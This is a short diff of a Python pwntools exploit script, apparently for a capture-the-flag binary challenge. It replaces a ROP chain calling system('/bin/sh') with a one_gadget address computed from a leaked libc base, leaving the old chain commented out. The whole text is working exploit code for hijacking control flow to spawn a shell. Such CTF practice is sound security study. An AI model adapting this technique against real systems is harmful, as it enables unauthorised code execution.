@@ -39,7 +39,7 @@ def change(name):
     p.recvuntil("> ")
     p.sendline("5")
     p.recvuntil(" : ")
-    p.send(str(name))
+    p.send(name)
 
 p.recvuntil('name : ')
 p.send('leeminjea')
@@ -65,11 +65,16 @@ print(hex(libc_base))
 sys = libc_base + 0x453a0
 binsh = libc_base + 0x18ce57
 
+one = libc_base + 0xf1247
+
 change(p64(libc_puts))
 
+# pay = b''
+# pay += p64(pop_rdi) + p64(binsh)
+# pay += p64(sys)
+
 pay = b''
-pay += p64(pop_rdi) + p64(binsh)
-pay += p64(sys)
+pay += p64(one)
 
 modify(p64(libc_puts), pay)
 
